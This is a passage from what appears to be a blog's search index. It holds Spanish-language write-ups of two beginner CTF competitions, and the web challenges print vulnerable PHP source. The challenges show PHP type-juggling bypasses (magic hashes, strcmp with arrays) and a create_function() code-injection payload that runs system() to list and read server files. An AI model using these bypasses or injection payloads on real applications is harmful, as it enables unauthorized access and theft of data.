\u0026lt;html\u0026gt; \u0026lt;title\u0026gt;Magic Password\u0026lt;/title\u0026gt; \u0026lt;head\u0026gt; \u0026lt;link href=\u0026#34;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34; integrity=\u0026#34;sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt; \u0026lt;style\u0026gt; .corb-body { background-color: #B53471;} .centered { position: fixed; top: 50%; left: 50%; /* bring your own prefixes */ transform: translate(-50%, -50%); } .corb-login-length { width: 200px;} .corb-submit { position: relative; left: auto; right: -120px;} .corb-flag { color: #ffffff; } .corb-alert { margin-top: 20px; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body class=\u0026#34;corb-body container-fluid\u0026#34;\u0026gt; \u0026lt;?php include \u0026#39;flag.php\u0026#39;; if($_POST[\u0026#34;password\u0026#34;]) { $md5 = \u0026#34;240610708\u0026#34;; if ($_POST[\u0026#34;password\u0026#34;] != $md5 and hash(\u0026#34;md5\u0026#34;,$_POST[\u0026#34;password\u0026#34;]) == hash(\u0026#34;md5\u0026#34;, $md5)) { echo(\u0026#39;\u0026lt;h1\u0026gt;\u0026lt;div class=\u0026#34;alert alert-success centered\u0026#34; role=\u0026#34;alert\u0026#34;\u0026gt; Flag: \u0026#39;.$flag.\u0026#39; \u0026lt;/div\u0026gt;\u0026lt;/h1\u0026gt;\u0026#39;); } else { echo (\u0026#39;\u0026lt;h1\u0026gt;\u0026lt;div class=\u0026#34;alert alert-danger centered\u0026#34; role=\u0026#34;alert\u0026#34;\u0026gt;Sorry, Wrong password!\u0026lt;/div\u0026gt;\u0026lt;/h1\u0026gt;\u0026#39;); } die(); } ?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;centered\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;well\u0026#34;\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h3 class=\u0026#34;corb-login-length\u0026#34;\u0026gt;Password login\u0026lt;/h3\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;form method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;password\u0026#34; class=\u0026#34;form-control\u0026#34; type=\u0026#34;text\u0026#34; placeholder=\u0026#34;Password\u0026#34;\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;button class=\u0026#34;corb-submit btn btn-primary btn-lg\u0026#34; type=\u0026#34;submit\u0026#34;\u0026gt;Submit\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script src=\u0026#34;https://code.jquery.com/jquery-3.1.1.min.js\u0026#34; integrity=\u0026#34;sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8=\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;!-- see ?debug for source--\u0026gt; \u0026lt;/html\u0026gt; Solución Se puede ver que el login recibirá por medio de POST el parámetro password y posteriormente hará una validación del valor que se le pase comparándose con la cadena 240610708 y el valor de los hashes md5 dados por php. Por lo que se necesita hacer un bypass de esta validación. Dado el nombre del reto nos puede sonar una mala implementación de código en los sistemas de autenticación hechos en php, llamada Magic Hashes por lo que una búsqueda de esto fácilmente nos puede dar la respuesta al reto. En este artículo, se da un ejemplo del bypass con los magic hashes justamente con el valor que se está usando en el reto, por lo que la cadena QNKCDZO en el parámetro del campo password nos daría la bandera.\nFlag  biotCTF{m4g14_b10t_s1}\n Numeros de la suerte [300 pts] Descripción  ¡Llevemos tu suerte al límite, adivina el número correcto y obtendrás el premio!. http://3.135.19.159/numeric/index.php\n Pistas\n http://3.135.19.159/numeric/index.php?codigo_fuente  index.php?codigo_fuente\n\u0026lt;?php if (isset($_GET[\u0026#39;codigo_fuente\u0026#39;])) { die(highlight_file(__FILE__)); } ?\u0026gt;\u0026lt;!DOCTYPE HTML\u0026gt; \u0026lt;html\u0026gt; \u0026lt;title\u0026gt;Lucky numbers\u0026lt;/title\u0026gt; \u0026lt;head\u0026gt; \u0026lt;link href=\u0026#34;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34; integrity=\u0026#34;sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt; \u0026lt;style\u0026gt; .corb-body { background-color: #2d98da;} .centered { position: fixed; top: 50%; left: 50%; /* bring your own prefixes */ transform: translate(-50%, -50%); } .corb-login-length { width: 200px;} .corb-submit { position: relative; left: auto; right: -120px;} .corb-flag { color: #ffffff; } .corb-alert { margin-top: 20px; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body class=\u0026#34;corb-body container-fluid\u0026#34;\u0026gt; \u0026lt;?php require \u0026#39;flag.php\u0026#39;; $angka = $_GET[\u0026#39;number\u0026#39;]; if (isset($angka)) { if (is_numeric($angka)){ if (!strpos($angka, \u0026#34;.\u0026#34;)){ if (strlen($angka) \u0026gt; 6){ if ($angka \u0026lt; 99999 \u0026amp;\u0026amp; $angka \u0026gt; 90000) echo(\u0026#39;\u0026lt;h1\u0026gt;\u0026lt;div class=\u0026#34;alert alert-success centered\u0026#34; role=\u0026#34;alert\u0026#34;\u0026gt; Flag: \u0026#39;.$flag.\u0026#39; \u0026lt;/div\u0026gt;\u0026lt;/h1\u0026gt;\u0026#39;); else echo(\u0026#39;\u0026lt;h1\u0026gt;\u0026lt;div class=\u0026#34;alert alert-danger centered\u0026#34; role=\u0026#34;alert\u0026#34;\u0026gt;Demasiado largo!\u0026lt;/div\u0026gt;\u0026lt;/h1\u0026gt;\u0026#39;); } else echo(\u0026#39;\u0026lt;h1\u0026gt;\u0026lt;div class=\u0026#34;alert alert-danger centered\u0026#34; role=\u0026#34;alert\u0026#34;\u0026gt;Demasiado corto!\u0026lt;/div\u0026gt;\u0026lt;/h1\u0026gt;\u0026#39;); } else echo(\u0026#39;\u0026lt;h1\u0026gt;\u0026lt;div class=\u0026#34;alert alert-danger centered\u0026#34; role=\u0026#34;alert\u0026#34;\u0026gt;no uses puntos!\u0026lt;/div\u0026gt;\u0026lt;/h1\u0026gt;\u0026#39;); } else echo(\u0026#39;\u0026lt;h1\u0026gt;\u0026lt;div class=\u0026#34;alert alert-danger centered\u0026#34; role=\u0026#34;alert\u0026#34;\u0026gt;deben ser numeros!\u0026lt;/div\u0026gt;\u0026lt;/h1\u0026gt;\u0026#39;); die; } ?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;centered\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;well\u0026#34;\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h3 class=\u0026#34;corb-login-length\u0026#34;\u0026gt;Gacha is our life\u0026lt;/h3\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;form method=\u0026#34;GET\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;number\u0026#34; class=\u0026#34;form-control\u0026#34; type=\u0026#34;text\u0026#34; placeholder=\u0026#34;Lucky Numbers\u0026#34;\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;button class=\u0026#34;corb-submit btn btn-primary btn-lg\u0026#34; type=\u0026#34;submit\u0026#34;\u0026gt;Submit\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script src=\u0026#34;https://code.jquery.com/jquery-3.1.1.min.js\u0026#34; integrity=\u0026#34;sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8=\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;!-- see ?debug for source--\u0026gt; \u0026lt;/html\u0026gt; Solución Para este reto, basta con hacer una búsqueda para ver qué hace cada validación implementada en el código. Inicialmente se puede ver que la implementación recibirá un parámetro con el nombre de number, dicho esto se puede traducir cada validación en lo siguiente:\n isset($angka) → Verifica que la variable tenga un valor diferente del nulo. is_numeric($angka) → Verifica que la variable contenga un tipo de dato numérico. !strpos($angka, \u0026quot;.\u0026quot;) → Verifica que la variable no contenga ningún punto decimal. strlen($angka) \u0026gt; 6 → Verifica que la longitud de la variable sea mayor a 6. $angka \u0026lt; 99999 \u0026amp;\u0026amp; $angka \u0026gt; 90000 → Verifica que la variable sea un número mayor a 90000 y menor que 99999.  Para saltar todas las validaciones se tendría que mandar un número en el rango permitido y para hacer un bypass de la longitud se podría añadirle ceros a la izquierda dado que inicialmente la variable es tratada como string. El valor utilizado fue 0090005\nFlag  biotCTF{num3r1c0_b10t_l1m1t3}\n Strcmp V10 [100 pts] Descripción  Jimmy creó un sitio web donde almacena sus secretos\u0026hellip; Desafortunadamente, no podemos iniciar sesión en su sitio web. ¡Ayúdame a encontrar el secreto de Jimmy!. http://3.135.19.159/admin/index.php\n Pistas\n http://3.135.19.159/admin/index.php?codigo_fuente  index.php?codigo_fuente\n\u0026lt;?php if (isset($_GET[\u0026#39;codigo_fuente\u0026#39;])) { die(highlight_file(__FILE__)); } ?\u0026gt;\u0026lt;!DOCTYPE HTML\u0026gt; \u0026lt;html\u0026gt; \u0026lt;title\u0026gt;Strcmp v1.0\u0026lt;/title\u0026gt; \u0026lt;head\u0026gt; \u0026lt;link href=\u0026#34;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34; integrity=\u0026#34;sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt; \u0026lt;style\u0026gt; .corb-body { background-color: #2c3e50;} .centered { position: fixed; top: 50%; left: 50%; /* bring your own prefixes */ transform: translate(-50%, -50%); } .corb-login-length { width: 200px;} .corb-submit { position: relative; left: auto; right: -120px;} .corb-flag { color: #ffffff; } .corb-alert { margin-top: 20px; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body class=\u0026#34;corb-body container-fluid\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;centered\u0026#34;\u0026gt; \u0026lt;?php require \u0026#39;flag.php\u0026#39;; if (isset($_POST[\u0026#39;password\u0026#39;])) { if (strcmp($_POST[\u0026#39;password\u0026#39;], $flag) == 0) echo(\u0026#39;\u0026lt;h1\u0026gt;\u0026lt;div class=\u0026#34;alert alert-success centered\u0026#34; role=\u0026#34;alert\u0026#34;\u0026gt; Flag: \u0026#39;.$flag.\u0026#39; \u0026lt;/div\u0026gt;\u0026lt;/h1\u0026gt;\u0026#39;); else echo(\u0026#39;\u0026lt;h1\u0026gt;\u0026lt;div class=\u0026#34;alert alert-danger centered\u0026#34; role=\u0026#34;alert\u0026#34;\u0026gt;Sorry, Wrong password!\u0026lt;/div\u0026gt;\u0026lt;/h1\u0026gt;\u0026#39;); die; } ?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;centered\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;well\u0026#34;\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h3 class=\u0026#34;corb-login-length\u0026#34;\u0026gt;Admin Login\u0026lt;/h3\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;form method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;username\u0026#34; class=\u0026#34;form-control\u0026#34; type=\u0026#34;text\u0026#34; placeholder=\u0026#34;username\u0026#34;\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;input name=\u0026#34;password\u0026#34; class=\u0026#34;form-control\u0026#34; type=\u0026#34;text\u0026#34; placeholder=\u0026#34;password\u0026#34;\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;input name=\u0026#34;submit\u0026#34; class=\u0026#34;corb-submit btn btn-primary btn-lg\u0026#34; type=\u0026#34;submit\u0026#34; value=\u0026#34;Login\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script src=\u0026#34;https://code.jquery.com/jquery-3.1.1.min.js\u0026#34; integrity=\u0026#34;sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8=\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;!-- see ?debug for source--\u0026gt; \u0026lt;/html\u0026gt; Solución Dado que la comparación del parámetro password y la bandera está siendo realizada con un operador doble, la comparación NULL == 0 va a dar TRUE por lo que si eso se concatena con el hecho de que la función strcmp() tiene problemas al compararse con otra cosa y puede retornar NULL si entre las entidades se compara con un arreglo vacío. Se puede utilizar este hecho para pasar la validación que se está realizando, usando password[]=%22 como parámetro. Se utilizaron las siguientes publicaciones para llevar a cabo la solución del reto:\n http://www.dimuthu.org/blog/2008/10/31/triple-equal-operator-and-null-in-php/ https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016  Flag Desafortunadamente no se guardó el valor de esta flag xD\nStrcmp v20 [200 pts] Descripción  Jimmy ha almacenado un nuevo secreto en su sitio web que indica que se ha actualizado la seguridad. ¿Puedes repetir tu acción para encontrar el secreto de Jimmy?. http://3.135.19.159/otp/index.php\n Pistas\n http://3.135.19.159/otp/index.php?codigo_fuente  index.php?codigo_fuente\n\u0026lt;?php if (isset($_GET[\u0026#39;codigo_fuente\u0026#39;])) { die(highlight_file(__FILE__)); } ?\u0026gt;\u0026lt;!DOCTYPE HTML\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Strcmp v2.0\u0026lt;/title\u0026gt; \u0026lt;link href=\u0026#34;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34; integrity=\u0026#34;sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt; \u0026lt;style\u0026gt; .corb-body { background-color: #16a085;} .centered { position: fixed; top: 50%; left: 50%; /* bring your own prefixes */ transform: translate(-50%, -50%); } .corb-login-length { width: 200px;} .corb-submit { position: relative; left: auto; right: -120px;} .corb-flag { color: #ffffff; } .corb-alert { margin-top: 20px; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body class=\u0026#34;corb-body container-fluid\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;centered\u0026#34;\u0026gt; \u0026lt;?php function len($x) { if (is_array($x)) return count($x); return strlen($x); } require(\u0026#34;flag.php\u0026#34;); $otp = $_GET[\u0026#34;code\u0026#34;]; $cek = len($otp)==11; for ($i=0; $i\u0026lt;len($otp); $i++){ if (strcmp($otp[$i], $secret[$i])!=0){ $cek = false; } if ($cek) { echo(\u0026#39;\u0026lt;h1\u0026gt;\u0026lt;div class=\u0026#34;alert alert-success centered\u0026#34; role=\u0026#34;alert\u0026#34;\u0026gt; Flag: \u0026#39;.$flag.\u0026#39; \u0026lt;/div\u0026gt;\u0026lt;/h1\u0026gt;\u0026#39;); }else{ echo(\u0026#39;\u0026lt;h1\u0026gt;\u0026lt;div class=\u0026#34;alert alert-danger centered\u0026#34; role=\u0026#34;alert\u0026#34;\u0026gt;Sorry, Wrong password!\u0026lt;/div\u0026gt;\u0026lt;/h1\u0026gt;\u0026#39;); } die; } ?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;centered\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;well\u0026#34;\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h3 class=\u0026#34;corb-login-length\u0026#34;\u0026gt;OTP Login\u0026lt;/h3\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;form method=\u0026#34;GET\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;code\u0026#34; class=\u0026#34;form-control\u0026#34; type=\u0026#34;text\u0026#34; placeholder=\u0026#34;OTP Code\u0026#34;\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;button class=\u0026#34;corb-submit btn btn-primary btn-lg\u0026#34; type=\u0026#34;submit\u0026#34;\u0026gt;Submit\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script src=\u0026#34;https://code.jquery.com/jquery-3.1.1.min.js\u0026#34; integrity=\u0026#34;sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8=\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;!-- see ?debug for source--\u0026gt; \u0026lt;/html\u0026gt; Solución Se presentó la misma situación que la versión anterior del reto con diferencia de que se realiza de forma iterativa por lo que se puede hacer uso de la misma implementación con un ligero cambio, llenando todos los índicies (11) con arreglos vacíos, quedando el parámetro utilizado así code[0][]=%22\u0026amp;code[1][]=%22\u0026amp;code[2][]=%22...code[10][]=%22. Se utilizó esta pregunta de stackoverflow como referencia.\nFlag  biotCTF{0pt_b10t_2}\n ","permalink":"https://rzul.me/posts/biot-ctf/","summary":"Intro Dándole continuidad a las prácticas y CTFs en los que he participado, el pasado 19 de junio no fue la excepción. El nivel de dificultad, desde mi perspectiva, lo consideré amigable para los principiantes por lo que para quién se encuentra tratando de pulir habilidades fue un buen reto. Desafortunadamente no pude recopilar más información de sus creadores, más que la que está disponible en su página de twitter, un colega me puso al tanto de la info y decidimos tomar el reto.","title":"BiOt CTF"},{"content":"Intro El día 3 abril del 2021 TeamShakti publicó su anual competición CTF Beginner Friendly que lleva por nombre el mismo que el equipo ShaktiCTF. Tome la decisión de participar y probar suerte siendo que \u0026ldquo;oficialmente\u0026rdquo; nunca había participado en un CTF. Me pareció una buena oportunidad para practicar, aprender cosas nuevas y pulir mis habilidades, poniendo como objetivo (aunque lo considero apresurado) el alcanzar un rango aceptable en el próximo CTF de Hackthebox.\nPresento un Write-up de los retos que pude resolver durante mi participación.\nForensics Follow up - 50 Descripción We got a clue from one of our investigators that an interesting secret was transferred in our network. Help us find out the secret.\nnetwork1.pcapng\nSolución Se descargó un archivo tipo pcapng se identificó un stream TCP con wireshark y se siguió dicho stream el cuál proporcionó un pastebin\nDentro del contenido del pastebin venía la bandera\nBandera: shaktictf{Th15_w4s_eA5Y!!}\nDelete - 100 Descripción Sometimes what you see is not always true\u0026hellip;\nchall.png\nSolución Se descargó la imagen y después analizar el archivo con binwalk se vio que había aparentemente dos imágenes en el mismo archivo, siguiendo la pista del título del reto se separaron los bytes iniciales que correspondían a la primera imagen usando dd\n┌──(kali㉿kali)-[~/Desktop/shaktictf/forensics] └─$ binwalk chall.png DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 264 x 191, 8-bit colormap, non-interlaced 48 0x30 PNG image, 1200 x 1200, 8-bit/color RGBA, non-interlaced 89 0x59 Zlib compressed data, default compression ┌──(kali㉿kali)-[~/Desktop/shaktictf/forensics] └─$ dd skip=48 if=chall.png of=chall1.png bs=1 46287+0 records in 46287+0 records out 46287 bytes (46 kB, 45 KiB) copied, 0.284482 s, 163 kB/s De esa manera chall1.png se vuelve una imagen que se puede visualizar con un visor de imágenes sin ningún problema. Obteniendo así la bandera.\nBandera: shaktictf{Y0u_4R3_aM4z1nG!!!!}\nWeb Magic - 100 Descripción I found creating new functionalities as magic. So I went and created quite a few, now I don\u0026rsquo;t remember what is what. help me remember them :( !\ncheck out my application - http://35.238.173.184/\nSolución De acuerdo con el log que se dio en /admin.php se buscó alguna vulnerabilidad respecto a la mención de una función deprecada create_function() y se observó que era vulnerable a inyección de código.\nPermitiendo el listado de archivos en el directorio mediante:\nreturn -1 * var_dump($a[\u0026quot;\u0026quot;]);}system(\u0026quot;ls -la\u0026quot;);/*\u0026quot;]\ntotal 84 drwxrwxrwx 1 www-data www-data 4096 Apr 3 11:43 . drwxr-xr-x 1 root root 4096 Mar 31 09:51 .. -rw-r--r-- 1 www-data www-data 0 Apr 3 11:02 12345642312 -rw-r--r-- 1 www-data www-data 65 Apr 2 23:39 1998_Dumb_secrets.php -rw-rw-r-- 1 www-data www-data 134 Apr 2 23:19 Dockerfile -rw-r--r-- 1 www-data www-data 39 Apr 3 11:40 a -rw-r--r-- 1 www-data www-data 0 Apr 3 11:39 aaa -rw-r--r-- 1 www-data www-data 1 Apr 3 11:40 aaaa -rw-r--r-- 1 www-data www-data 3251 Apr 2 22:45 admin.php lrwxrwxrwx 1 www-data www-data 8 Apr 3 11:43 asd -\u0026gt; flag.txt -rw-r--r-- 1 www-data www-data 1886 Apr 2 22:45 chat.html -rw-r--r-- 1 www-data www-data 1744 Apr 2 22:45 check.html drwxr-xr-x 1 www-data www-data 4096 Apr 2 22:47 css -rw-r--r-- 1 www-data www-data 39 Apr 3 09:58 flag.html -rw-r--r-- 1 www-data www-data 39 Apr 3 11:35 flag.php -rw-r--r-- 1 www-data www-data 39 Apr 3 09:57 flag.txt drwxr-xr-x 1 www-data www-data 4096 Apr 2 22:47 fonts -rw-r--r-- 1 www-data www-data 1935 Apr 2 22:45 index.html -rw-r--r-- 1 www-data www-data 2114 Apr 2 22:45 login.html -rw-r--r-- 1 www-data www-data 1949 Apr 2 22:45 report.html -rw-r--r-- 1 www-data www-data 1976 Apr 2 22:45 rules.html -rw-r--r-- 1 www-data www-data 0 Apr 3 11:04 s.php -rw-r--r-- 1 www-data www-data 5 Apr 3 10:06 test.php Contenido de admin.php mediante:\nreturn -1 * var_dump($a[\u0026quot;\u0026quot;]);}system(\u0026quot;cat admin.php\u0026quot;);/*\u0026quot;]\nVer código fuente del resultado\n\u0026lt;?php ini_set(\u0026#39;display_errors\u0026#39;, \u0026#39;on\u0026#39;); ini_set(\u0026#39;error_reporting\u0026#39;, E_ALL); $success = \u0026#39; \u0026lt;div class=\u0026#34;alert alert-success alert-dismissible\u0026#34; role=\u0026#34;alert\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; class=\u0026#34;close\u0026#34; data-dismiss=\u0026#34;alert\u0026#34; aria-label=\u0026#34;Close\u0026#34;\u0026gt;\u0026lt;span aria-hidden=\u0026#34;true\u0026#34;\u0026gt;\u0026amp;times;\u0026lt;/span\u0026gt;\u0026lt;/button\u0026gt; Function declared. \u0026lt;/div\u0026gt; \u0026#39;; include \u0026#34;flag.php\u0026#34;; if (isset ($_POST[\u0026#39;c\u0026#39;]) \u0026amp;\u0026amp; !empty ($_POST[\u0026#39;c\u0026#39;])) { $blacklist = \u0026#34;/mv|rm|exec/i\u0026#34;; $code = $_POST[\u0026#39;c\u0026#39;]; if(strlen($code)\u0026gt;60) { die(\u0026#34;too long to execute\u0026#34;); } if(preg_match($blacklist,$code)){ die(\u0026#34;that\u0026#39;s blocked\u0026#34;); } $fun = create_function(\u0026#39;$flag\u0026#39;, $code); print($success); } ?\u0026gt;Habiendo identificado un archivo que no es común 1998_Dumb_secrets.php se intentó ver su contenido mediante:\nreturn -1 * var_dump($a[\u0026quot;\u0026quot;]);}system(\u0026quot;cat 1998_Dumb_secrets.php\u0026quot;);/*\u0026quot;]\nObteniendo como resultado\ntoo long to execute\nObservando el código que procesa la petición, vemos que verifica la longitud del formulario por lo que si acortamos el valor enviado, la función nos dejará leer el archivo que queremos. Utilizando:\nreturn -1;}system(\u0026quot;cat 1998_Dumb_secrets.php\u0026quot;);/*\u0026quot;]\nVer código fuente del resultado\n\u0026lt;?php $flag1=\u0026quot;shaktictf{p0tn714l_0f_func710n5_4r3_1nf1n173}\u0026quot;; ?\u0026gt; Bandera: shaktictf{p0tn714l_0f_func710n5_4r3_1nf1n173}\nCrypto Classically Easy - 50 Descripción ovmogeqfj{yahe_wgwff_avpv_eszahtmac_qxefowoey!}\nSolución Realizando un poco de análisis a la cadena que se presenta en la descripción del reto se puede ver claramente que presenta un formato de bandera con excepción de los caractéres especiales, por lo que después de descartar las opciones que pudieran servir para descifrarla (Cifrado César, ROT N). Se trató de hacer otro alcance siguiendo el mismo principio de la rotación.\n   Char Recibido Valor de rotación Char Conocido     o +4 s   v +12 h   m +14 a   o +22 k   g +13 t   e +4 i   q +12 c   f +14 t   j +22 f    Lo que podría significar un patrón númerico de rotación dada la repetición de los espacios recorridos del char dado y el char de la bandera, siendo +4,+12,+14,+22,+13.\nEjercicio manual de sustitución\nshaktictf{lets_start_with_14,22,13,4,12,14,22,13,4_12,14,22,13,4,12,14,22,13!}\nOptimización del método por medio de un script simple.\n#!/usr/bin/python abc = \u0026#34;abcdefghijklmnopqrstuvwxyz\u0026#34; values = [4,12,14,22,13] decrypt = \u0026#34;ovmogeqfj{yahe_wgwff_avpv_eszahtmac_qxefowoey!}\u0026#34; avoid = \u0026#34;{}_!\u0026#34; flag = \u0026#34;\u0026#34; valIndex = 0 for letter in decrypt: if letter in avoid: flag += letter continue if valIndex \u0026gt;= len(values): valIndex = 0 flag += abc[(abc.index(letter) + values[valIndex]) - len(abc)] valIndex += 1 print(flag) Resultado del script\nBandera: shaktictf{lets_start_with_something_classical!}\nMisc Sanity Check - 10 Al leer las reglas dentro del servidor de discord se encuentra la bandera\n13 . Grab your 10 points : shaktictf{G00d_t0_r34d_th3_rUl3s!}\nBandera: shaktictf{G00d_t0_r34d_th3_rUl3s!}\ndecodeit - 100 Descripción just decode it!\nSolución Imagen descargada en código de barras\nSe utilizó https://zxing.org/w/decode.jspx para decodear la imagen y obtener la bandera\nDecode Succeeded Raw text\tshaktictf{N1C3_w0rK_Fr13nD} Raw bytes\t68 53 48 41 4b 54 49 43 54 46 5b 2e 11 23 13 3f 57 10 52 2b 3f 26 52 11 13 4e 24 5d 65 6a Barcode format\tCODE_128 Parsed Result Type\tTEXT Parsed Result\tBandera: shaktictf{N1C3_w0rK_Fr13nD}\nÚltimas palabras Considerando que fue \u0026ldquo;one-man show\u0026rdquo; se obtuvo el lugar 156 de 452 en el ranking con un puntaje de 410 puntos.\nWrite-ups no oficiales de algunos retos\n","permalink":"https://rzul.me/posts/first-ctf/","summary":"Intro El día 3 abril del 2021 TeamShakti publicó su anual competición CTF Beginner Friendly que lleva por nombre el mismo que el equipo ShaktiCTF. Tome la decisión de participar y probar suerte siendo que \u0026ldquo;oficialmente\u0026rdquo; nunca había participado en un CTF. Me pareció una buena oportunidad para practicar, aprender cosas nuevas y pulir mis habilidades, poniendo como objetivo (aunque lo considero apresurado) el alcanzar un rango aceptable en el próximo CTF de Hackthebox.","title":"Mi Primer CTF"}]